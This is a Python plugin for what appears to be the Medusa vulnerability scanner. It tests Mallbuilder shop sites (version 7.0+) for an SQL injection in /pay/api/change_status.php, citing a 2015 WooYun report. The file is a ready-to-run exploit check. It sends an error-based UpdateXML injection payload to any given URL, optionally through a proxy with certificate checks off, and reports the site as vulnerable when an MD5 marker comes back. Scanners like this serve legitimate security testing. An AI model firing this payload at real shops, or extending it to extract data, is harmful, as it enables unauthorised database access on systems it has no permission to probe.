#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Mallbuilder商城系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0152481
author: Lucifer
description: 在7.0+版本中,文件位于目录/pay/api/change_status.php,直接拼接参数造成SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/pay/api/change_status.php?id=1%27Or%20UpDaTeXmL%281%2CCoNcAt%280x7e%2C%28SeLeCt%20Md5%281234%29%20LiMit%200%2C1%29%29%2C0%29%20Or%27"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed05')!=-1:
            Medusa = "{} 存在Mallbuilder商城系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass